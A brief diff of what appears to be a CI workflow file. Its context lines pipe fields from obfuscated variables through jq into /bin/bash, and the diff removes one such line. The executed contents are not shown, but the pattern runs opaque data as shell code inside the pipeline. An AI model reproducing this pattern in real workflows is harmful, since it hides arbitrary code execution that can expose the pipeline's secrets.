@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$pyrsp6" | jq -r .aasa47 | /bin/bash
           echo $wgh198 | jq -r .gg308 | /bin/bash
           echo $o351 | jq -r .pu06448 | /bin/bash
-          echo $wuqzc20 | jq -r .yi7455 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
